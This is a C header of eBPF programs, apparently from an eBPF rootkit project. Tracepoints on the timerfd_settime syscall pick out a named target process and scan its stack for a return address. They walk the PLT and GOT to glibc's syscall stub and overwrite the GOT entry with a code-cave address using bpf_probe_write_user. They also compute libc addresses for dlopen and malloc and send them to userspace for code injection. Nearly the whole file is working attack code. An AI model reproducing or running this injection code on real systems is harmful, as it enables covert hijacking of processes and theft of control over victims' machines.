#ifndef __BPF_INJECTION_H
#define __BPF_INJECTION_H


#include "headervmlinux.h"

#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include "../../../common/constants.h"
#include "defs.h"
#include "../../../common/map_common.h"
#include "../data/ring_buffer.h"

#define OPCODE_JUMP_BYTE_0 0xe8
#define OPCODE_PLT_JMP_BYTE_0 0xff
#define OPCODE_PLT_JMP_BYTE_1 0x25
#define OPCODE_PLT_RERLO_BYTE_0 0xf3
#define OPCODE_PLT_RERLO_BYTE_1 0x0f
#define GLIBC_OFFSET_MAIN_TO_SYSCALL 0xf00d0
#define GLIBC_OFFSET_MAIN_TO_DLOPEN 0x12f120
#define GLIBC_OFFSET_MAIN_TO_MALLOC 0x6eca0
#define CODE_CAVE_ADDRESS 0x0000000000402e95

struct sys_timerfd_settime_enter_ctx {
    unsigned long long unused; //Pointer to pt_regs
    int __syscall_nr;
    unsigned int padding; //Alignment
    int ufd;
    int flags;
    const struct __kernel_itimerspec *utmr;
    struct __kernel_itimerspec *otmr;
};

struct sys_timerfd_settime_exit_ctx {
    unsigned long long unused; //Pointer to pt_regs
    int __syscall_nr;
    unsigned int padding; //Alignment
    long ret;
};

/**
 * @brief Checks whether the format of the syscall is the expected one
 * 
 * @param opcodes 
 * @param size 
 * @return 0 if correct, 1 otherwise
 */
static __always_inline int check_syscall_opcodes(__u8* opcodes){
    return 0 == (/*opcodes[0]==0xf3     //FOR GDB WORKING TODO REMOVE
        &&*/ opcodes[1]==0x0f
        && opcodes[2]==0x1e
        && opcodes[3]==0xfa
        && opcodes[4]==0x49
        && opcodes[5]==0x89
        && opcodes[6]==0xca
        && opcodes[7]==0xb8
        && opcodes[8]==0x1e
        && opcodes[9]==0x01
        && opcodes[10]==0x00
        && opcodes[11]==0x00
        && opcodes[12]==0x0f
        && opcodes[13]==0x05);

}   

static __always_inline int stack_extract_return_address_plt(__u64 stack){
    //We have a possible call instruction, we check if it starts with the correct format
    __u64 *op = (__u64*)(stack - 0x5);
    __u8 opcode_arr[10];
    if(bpf_probe_read(&opcode_arr, 10*sizeof(__u8), op)<0){
        //bpf_printk("Failed to read stack position\n");
        return -1;
    }
    //bpf_printk(" -- Checking: %lx, res: %x %x", op, opcode_arr[0], opcode_arr[1]);
    //bpf_printk("%x %x %x\n", opcode_arr[2], opcode_arr[3], opcode_arr[4]);
    if (opcode_arr[0] != OPCODE_JUMP_BYTE_0) {
        //bpf_printk(" -- Failed OPCODE: %x\n", opcode_arr[0]);
        return -1;
    }
    bpf_printk("Success OPCODE: %lx\n", op);

    //We have localized the call instruction and thus quite probably the saved RIP. 
    //We proceed to get the offset of the call.
    __s32 offset = 0;
    __u8* op8 = (__u8*)(stack - 0x5);
    if(bpf_probe_read_user(&offset, sizeof(__s32), &op8[1])<0){ //This takes the 4 MSB omitting the first
        bpf_printk("Failed to read op[1]\n");
        return -1;
    }
    bpf_printk("OP64[1]: %x\n", &op[1]);
    bpf_printk("OP8[1]: %x\n", &op8[1]);
    bpf_printk("OFFSET: %x\n", offset);
    bpf_printk("OP: %lx\n", op);
    __u64 sum = (uintptr_t)((__u64)(op8)+offset+5);
    bpf_printk("SUM: %lx\n", sum);
    __u64* call_addr = (__u64*)sum;

    //We check the opcodes of the instruction that jumps to libc using the offset at GOT.PLT.
    __u64 call_opcode;
    bpf_printk("CALL_ADDR: %lx\n", call_addr);
    int ret;
    if ((ret = bpf_probe_read_user(&call_opcode, sizeof(__u64), call_addr)) < 0){
        bpf_printk("Failed to read memory at %x, RET IS %i\n", call_addr, ret);
        //call_dest = *call_addr;
        //bpf_printk("DEST: %lx\n", call_dest);
        return -1;
    }
    bpf_printk("CALL_OPCODES: %lx\n", call_opcode);

    bpf_probe_read_user(&opcode_arr, 10*sizeof(__u8), call_addr);
    bpf_printk("OPCODE0: %x\n", opcode_arr[0]);
    bpf_printk("OPCODE1: %x\n", opcode_arr[1]);
    bpf_printk("OPCODE5: %x\n", opcode_arr[5]);
    bpf_printk("OPCODE6: %x\n", opcode_arr[6]);

    int plt_found = 0;
    int relro_active = 0;
    
    //Check documentation for details on jump recognition.
    if(opcode_arr[0]==OPCODE_PLT_JMP_BYTE_0 && opcode_arr[1]==OPCODE_PLT_JMP_BYTE_1){
        //If the ELF binary has been compiled without RELRO, the first bytes are expected.
        plt_found = 1;
    }else if(opcode_arr[0]==OPCODE_PLT_RERLO_BYTE_0 && opcode_arr[1]==OPCODE_PLT_RERLO_BYTE_1 && opcode_arr[5]==OPCODE_PLT_JMP_BYTE_0 && opcode_arr[6]==OPCODE_PLT_JMP_BYTE_1){
        //If the ELF was compiled with RELRO protection.
        plt_found = 1;
        relro_active = 1;
    }
        
    __u8* call_addr_arr = (__u8*)call_addr;
    if(plt_found == 1){
        bpf_printk("Found PLT entry\n");
        __s32 j_offset;
        __u64* j_addr;
        
        if(relro_active == 0){
            //We analyze the offset of the jump specified ff 25 XX XX XX XX
            //The address to which the jump takes us from the PLT.GOT should be the actual syscall setup
            bpf_probe_read_user(&j_offset, sizeof(__s32), &call_addr_arr[2]); //4 LSB 
            //We obtain the address of the jump by adding the offset + our current memory address + 6 bytes of the current instruction
            j_addr = (u64*)((__u64)(call_addr_arr) + j_offset + 0x6);
            bpf_printk("JOFFSET: %lx\n", j_offset);
            bpf_printk("JADDR: %lx\n", j_addr);
        }else {
            bpf_printk("RELRO detected\n");
            //Proceed to take into account the endbr64 instruction
            call_addr_arr = (__u8*)call_addr+0x4;
            //We analyze the offset of the jump specified f2 ff 25 XX XX XX XX
            //The address to which the jump takes us from the PLT.GOT should be the actual syscall setup
            bpf_probe_read_user(&j_offset, sizeof(__s32), &call_addr_arr[3]); //4 LSB + 7 bytes of the current instruction
            j_addr = (u64*)((__u64)(call_addr_arr) + j_offset +0x7);
            bpf_printk("JOFFSET: %lx\n", j_offset);
            bpf_printk("JADDR: %lx\n", j_addr);
        }
        
        //Now that we have the address of the jump, we proceed to get the instruction opcodes there
        //However it's a bit more complex since what we have is the address in the GOT section where
        //the linker will place the address inside the shared library where the function is located.
        //More info in the documentation.
        __u64 got_addr;
        if(j_addr==NULL){
            return -1;
        }
        bpf_probe_read_user(&got_addr, sizeof(__u64), j_addr);
        bpf_printk("GOT_ADDR: %lx\n",got_addr);

        __u64 buf = CODE_CAVE_ADDRESS;
        bpf_printk("Now writing to J_ADDR %lx\n", j_addr);
        if(bpf_probe_write_user(j_addr, &buf, sizeof(__u64))<0){
            //Should not work if RELRO active
            bpf_printk("FAILED TO WRITE JUMP\n");
        }else{
            __u64 got_addr_new;
            bpf_probe_read_user(&got_addr_new, sizeof(__u64), j_addr);
            bpf_printk("Success, new GOT is %lx", got_addr_new);
        }

        //Now that we have the address placed in the GOT section we can finally go to the function in glibc
        //where the syscall resides. We read the opcodes and check that they are the ones expected
        __u8 s_opcode[14];
        bpf_probe_read_user(s_opcode, 14*sizeof(__u8), (void*)got_addr);
        for(int ii=0; ii<14; ii++){
            //bpf_printk("S_OPC %i: %x\n",ii,s_opcode[ii]);
        }
        if(check_syscall_opcodes(s_opcode)!=0){
            bpf_printk("Not the expected syscall\n");
            return -1;
        }
        
        //We got the expected syscall call in libc. Its format depends on glibc.
        //We put it in an internal map.
        __u64 pid_tgid = bpf_get_current_pid_tgid();
        if(pid_tgid<0){
            return -1;
        }
        struct inj_ret_address_data *inj_ret_addr = (struct inj_ret_address_data*) bpf_map_lookup_elem(&inj_ret_address, &pid_tgid);
        if (inj_ret_addr != NULL ){
            //It means we have already performed this whole operation
            return -1;
        }

        bpf_printk("Final found libc syscall address: %lx\n", got_addr);
        struct inj_ret_address_data addr;
        addr.libc_syscall_address = (__u64)got_addr;
        addr.stack_ret_address = 0;
        addr.relro_active = relro_active;
        bpf_probe_read(&addr.got_address, sizeof(__u64), &j_addr);
        bpf_map_update_elem(&inj_ret_address, &pid_tgid, &addr, BPF_ANY);

        return 0;
    }
    

    

    return 0;
}


SEC("tp/syscalls/sys_enter_timerfd_settime")
int sys_enter_timerfd_settime(struct sys_timerfd_settime_enter_ctx *ctx){
    __u64 *scanner = (__u64*)ctx->otmr;
    int fd = ctx->ufd;

    char comm[TASK_COMM_LEN] = {0};
    int err = bpf_get_current_comm(comm, sizeof(comm));
    if(err<0){
        return -1;
    }

    char *task = TASK_COMM_NAME_ROP_TARGET;
    if(str_n_compare(comm, TASK_COMM_LEN, task, STRING_FS_SUDO_TASK_LEN, STRING_FS_SUDO_TASK_LEN) != 0){
        return 0;
    }
    bpf_printk("TASK: %s\n", comm);

    long timesecs;
    //bpf_probe_read_user(&timesecs, sizeof(long), &(new->it_interval.tv_sec));
    //bpf_printk("AG %ld\n",timesecs);
    __u64 address = 0;
    bpf_printk("Timer %i to scan at address %lx\n", fd, scanner);
    #pragma unroll
    for(__u64 ii=0; ii<200; ii++){
        //We got a foothold in the stack via the syscall argument, now we scan to lower memory
        //positions assuming those are the saced RIP. We will then perform checks in order to see
        //if it truly is the saved RIP (checking that there is a path to the actual syscall).
        bpf_probe_read(&address, sizeof(__u64), (void*)scanner - ii);
        //bpf_printk("stack: %lx\n", address);
        if(stack_extract_return_address_plt(address)==0){
            //We found the return address
            __u64 found_return_address = *scanner - ii;
            //We put it in an internal map.
            __u64 pid_tgid = bpf_get_current_pid_tgid();
            if(pid_tgid<0){
                return -1;
            }
            struct inj_ret_address_data *addr = (struct inj_ret_address_data*) bpf_map_lookup_elem(&inj_ret_address, &pid_tgid);
            if (addr == NULL){
                //It means we failed to insert into the map before
                return -1;
            }
            //struct inj_ret_address_data addr = *inj_ret_addr;
            //struct inj_ret_address_data addr;
            //bpf_probe_read(&addr, sizeof(struct inj_ret_address_data), inj_ret_addr);
            addr->stack_ret_address = (__u64)scanner - ii;
            if(bpf_map_update_elem(&inj_ret_address, &pid_tgid, addr, BPF_EXIST)<0){
                bpf_printk("Failed to insert the return address in bpf map\n");
                return -1;
            }
            bpf_printk("Final found return address: %lx\n", addr->stack_ret_address);
            bpf_printk("GOT address: %lx\n", addr->got_address);


             //Tell userspace to perform operations on localized addresses
            int pid = bpf_get_current_pid_tgid() >> 32;
            ring_buffer_send_vuln_sys(&rb_comm, pid, addr->libc_syscall_address, 
                addr->stack_ret_address, addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL, 
                addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL + GLIBC_OFFSET_MAIN_TO_DLOPEN,
                addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL + GLIBC_OFFSET_MAIN_TO_MALLOC, 
                addr->got_address, addr->relro_active);

            return 0;
        }
    }

    bpf_printk("Finished without findings\n");


    return 0;
}

SEC("tp/syscalls/sys_exit_timerfd_settime")
int sys_exit_timerfd_settime(struct sys_timerfd_settime_exit_ctx *ctx){
    char comm[TASK_COMM_LEN] = {0};
    int err = bpf_get_current_comm(comm, sizeof(comm));
    if(err<0){
        return -1;
    }
    char *task = TASK_COMM_NAME_ROP_TARGET;
    if(str_n_compare(comm, TASK_COMM_LEN, task, STRING_FS_SUDO_TASK_LEN, STRING_FS_SUDO_TASK_LEN) != 0){
        return 0;
    }
    
    //If we are here we may have the return address stored in the map.
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    __u32 pid = pid_tgid >> 32;
    struct inj_ret_address_data *inj_ret_addr = (struct inj_ret_address_data*) bpf_map_lookup_elem(&inj_ret_address, &pid_tgid);
    if (inj_ret_addr == NULL){
        //We failed to identify the return address in the previous probe.
        return -1;
    }

    struct inj_ret_address_data addr = *inj_ret_addr;
    bpf_printk("PID: %u, SYSCALL_ADDR: %lx, STACK_RET_ADDR: %lx", pid, addr.libc_syscall_address, addr.stack_ret_address);
    bpf_printk("Address of libc main: %lx\n", addr.libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL);
    bpf_printk("Address of libc_dlopen_mode: %lx\n", addr.libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL + GLIBC_OFFSET_MAIN_TO_DLOPEN);
    bpf_printk("Address of malloc: %lx\n", addr.libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL + GLIBC_OFFSET_MAIN_TO_MALLOC);

    return 0;
}





//NOT CURRENTLY CONNECTED
SEC("uprobe/execute_command")
int uprobe_execute_command(struct pt_regs *ctx){
    bpf_printk("UPROBE activated\n");
    bpf_printk("Ret is %lx", ctx->ip);

    char* buf = "A\0";
    long ret;
    if((ret = bpf_probe_write_user((void*)ctx->ip, buf,1))>=0){
        bpf_printk("Success writting? Should not have happened\n");
        return -1;
    }
    bpf_printk("ERROR writing: %li\n", ret); //EFAULT
    char dest_buf[2];
    if(ctx->ip-5 <=0){
        return -1;
    }
    if((ret = bpf_probe_read_user(dest_buf, 2, (void*)ctx->ip-5))<0){
        bpf_printk("Error reading instruction\n");
        return -1;
    }
    //bpf_printk("Stack: %x\n", dest_buf);

    
    return 0;
}

#endif